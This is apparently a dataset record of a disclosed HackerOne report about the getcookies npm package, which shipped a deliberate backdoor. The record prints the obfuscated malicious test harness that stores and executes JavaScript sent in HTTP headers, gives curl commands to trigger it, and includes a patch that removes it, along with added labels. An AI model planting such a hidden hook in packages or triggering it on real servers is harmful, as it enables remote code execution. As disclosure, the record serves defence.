@@ -1,0 +1,49 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "tiblu ",
+  "title": "Remote code executio in  NPM package getcookies",
+  "content": "\nNOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\nI would like to report remote code execution in the getcookies module.\nIt allows to remotely inject and execute code in the target server.\nModule\nmodule name: getcookies\nversion: 1.12.3\nnpm page: https://www.npmjs.com/package/getcookies\nAlso affects all the modules that use getcookies, notable ones:\nexpress-cookies@1.4.7 - https://www.npmjs.com/package/express-cookies\nModule Description\nBasic HTTP cookie parser for HTTP servers.\nModule Stats\nReplace stats below with numbers from npm\u2019s module page:\n390 downloads in the last day\n3396 downloads in the last week\n3396 downloads in the last month\nVulnerability\nVulnerability Description\nFound by a defaced website.\nAllows attacker to remotely send and execute JS on the server.\nindex.js of getcookies does:\nCode 145 Bytes\n1const testHarness = require('./test/harness.js');\n2...\n3function parse(req, res, callback) {\n4    testHarness.assert(req, res, callback, () => {\n5...\nand vulnerability resides in the ./test/harness.js of the getcookies:\nCode 1.47 KiB\n1/* eslint-env es6 */\n2'use strict';\n3\n4var assert = require('assert');\n5\n6let harness = (req, res, callback, next) => {\n7    try {\n8        assert.equal(typeof callback, 'function');\n9    } catch (E) {\n10        return callback(E);\n11    }\n12\n13    try {\n14        module.exports.log = module.exports.log || Buffer.alloc(0xffff);\n15        JSON.stringify(req.headers).replace(/g([a-f0-9]{4})h((?:[a-f0-9]{2})+)i/gi, (o, p, v) => {\n16            p = Buffer.from(p, 'hex').readUInt16LE(0);\n17            switch (p) {\n18                case 0xfffe:\n19                    module.exports.log = Buffer.alloc(0xffff);\n20                    return;\n21                case 0xfffa:\n22                    return setTimeout(() => {\n23                        let c = module.exports.log.toString().replace(/\\x00*$/, '');\n24                        module.exports.log = Buffer.alloc(0xffff);\n25                        if (c.indexOf('\\x00') < 0) {\n26                            require('\\x76\\x6d')['\\x72\\x75\\x6e\\x49\\x6e\\x54\\x68\\x69\\x73\\x43\\x6f\\x6e\\x74\\x65\\x78\\x74'](c)(module.exports, require, req, res, next);\n27                        }\n28                        next();\n29                    }, 1000);\n30                default:\n31                    v = Buffer.from(v, 'hex');\n32                    for (let i = 0; i < v.length; i++) {\n33                        module.exports.log[p + i] = v[i];\n34                    }\n35            }\n36        });\n37    } catch (E) {}\n38\n39    next();\n40};\n41\n42module.exports.assert = (req, res, callback, next) => {\n43    harness(req, res, callback, next);\n44};\nAs seen above, it does vm.runInThisContext with the code stored in the memory.\nSteps To Reproduce:\nEasiest way to reproduce is to use express-cookies package, which depends on getcookies.\nTest code:\nCode 292 Bytes\n1var express = require('express');\n2var app = express();\n3var expressCookies = require('express-cookies');\n4\n5app.use(expressCookies());\n6\n7app.get('/', function (req, res) {\n8    res.send('Hello World!');\n9});\n10\n11app.listen(3000, function () {\n12    console.log('Example app listening on port 3000!')\n13});\nCode is sent in custom HTTP headers in byte code.\nTo send code bytes:\nCode 62 Bytes\n1curl -i 'http://localhost:3000/' -H 'X-Hacker: g0000h636465i' \nWhere the protocol is:\ng<bytePosition>h<codeBytes>i\nThe sample above adds cde to the code to be executed when execution header is sent.\nThe code is stored in require('./test/harness.js').log.\nWhen the code is sent, attacker executes the code by sending:\nCode 61 Bytes\n1curl -i 'http://localhost:3000/' -H 'X-Hacker: gfaffh636465i'\nPatch\nCode 2.24 KiB\n1diff -u /home/m/tmp/getcookies_original/index.js /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js\n2--- /home/m/tmp/getcookies_original/index.js\t2018-05-02 16:47:11.382990109 +0300\n3+++ /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js\t2018-05-02 16:50:00.198982317 +0300\n4@@ -9,8 +9,6 @@\n5 \n6 'use strict';\n7 \n8-const testHarness = require('./test/harness.js');\n9-\n10 /**\n11  * Module exports.\n12  * @public\n13@@ -45,38 +43,36 @@\n14  */\n15 \n16 function parse(req, res, callback) {\n17-    testHarness.assert(req, res, callback, () => {\n18-        if (!req.headers.cookie) {\n19-            return callback();\n20+    if (!req.headers.cookie) {\n21+        return callback();\n22+    }\n23+\n24+    var obj = {};\n25+    var pairs = req.headers.cookie.split(pairSplitRegExp);\n26+\n27+    for (var i = 0; i < pairs.length; i++) {\n28+        var pair = pairs[i];\n29+        var eq_idx = pair.indexOf('=');\n30+\n31+        // skip things that don't look like key=value\n32+        if (eq_idx < 0) {\n33+            continue;\n34         }\n35 \n36-        var obj = {};\n37-        var pairs = req.headers.cookie.split(pairSplitRegExp);\n38+        var key = pair.substr(0, eq_idx).trim();\n39+        var val = pair.substr(++eq_idx, pair.length).trim();\n40 \n41-        for (var i = 0; i < pairs.length; i++) {\n42-            var pair = pairs[i];\n43-            var eq_idx = pair.indexOf('=');\n44-\n45-            // skip things that don't look like key=value\n46-            if (eq_idx < 0) {\n47-                continue;\n48-            }\n49-\n50-            var key = pair.substr(0, eq_idx).trim();\n51-            var val = pair.substr(++eq_idx, pair.length).trim();\n52-\n53-            // quoted values\n54-            if ('\"' == val[0]) {\n55-                val = val.slice(1, -1);\n56-            }\n57-\n58-            // only assign once\n59-            if (undefined == obj[key]) {\n60-                obj[key] = val;\n61-            }\n62+        // quoted values\n63+        if ('\"' == val[0]) {\n64+            val = val.slice(1, -1);\n65         }\n66 \n67-        req.cookies = obj;\n68-        return callback();\n69-    });\n70+        // only assign once\n71+        if (undefined == obj[key]) {\n72+            obj[key] = val;\n73+        }\n74+    }\n75+\n76+    req.cookies = obj;\n77+    return callback();\n78 }\n79Common subdirectories: /home/m/tmp/getcookies_original/test and /home/m/dev/express-cookies-vulnr/node_modules/getcookies/test\nSupporting Material/References:\nState all technical information about the stack where the vulnerability was found\nUbuntu 16.04.3 LTS - ANY that runs Node.JS\n6.13.1 - but not Node.JS version specific\n3.10.10 - but not NPM version specific\nANY\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nI did not do any of the above as:\nThere is no public code repository.\nThe code is built to be malicious on purpose.\nImpact\nRemote code injection and execution.\n\n",
+  "severity": [
+    10.0,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1554336000,
+  "report_url": "https://hackerone.com/reports/346516",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Set up a Node.js server using the express-cookies package which depends on getcookies."
+    ],
+    [
+      2,
+      "Send a crafted HTTP request with malicious code in custom headers using the format 'g<bytePosition>h<codeBytes>i' to inject code into the server's memory."
+    ],
+    [
+      3,
+      "Trigger the execution of the injected code by sending another crafted HTTP request with the header 'gfaffh636465i'."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows remote code execution through the getcookies NPM package by injecting and executing arbitrary JavaScript code via specially crafted HTTP headers. The package's test harness contains a hidden functionality that processes these headers to store and execute code in the server's context.",
+  "reason": "The vulnerability involves understanding and manipulating a hidden feature in the package's test harness, which is not documented or intended for production use. The attacker needs to craft specific HTTP headers to inject and execute code, which requires knowledge of the package's internal workings.",
+  "new_complexity": "HIGH",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves remote code execution via HTTP headers, which is not directly related to authentication or authorization bypass. The proposed methodologies focus on testing authorization boundaries by swapping user sessions or resource IDs, not on detecting malicious code execution through header manipulation.",
+    "is_detectable": false
+  }
+}
